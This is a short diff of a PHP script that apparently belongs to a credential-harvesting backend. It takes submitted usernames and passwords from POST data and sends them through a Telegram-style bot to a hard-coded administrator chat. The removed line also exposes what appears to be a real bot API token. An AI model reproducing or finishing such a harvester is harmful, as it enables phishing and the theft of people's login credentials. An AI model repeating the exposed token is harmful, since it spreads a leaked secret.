@@ -1,5 +1,5 @@
 <?php
-$token = '7365322636:AAE-iF3yzO88fbKUHtbOos4XK5Uivmx-Yhs';
+$token = 'TOKEN';
 function bot($method, $data = []){
     global $token;
 
@@ -15,7 +15,7 @@ function bot($method, $data = []){
 }
 
 if (isset($_POST)) {
-    $cid = $_POST['cid'];
+    $cid = "ADMINID";
     $username = $_POST['username'];
     $password = $_POST['password'];
 
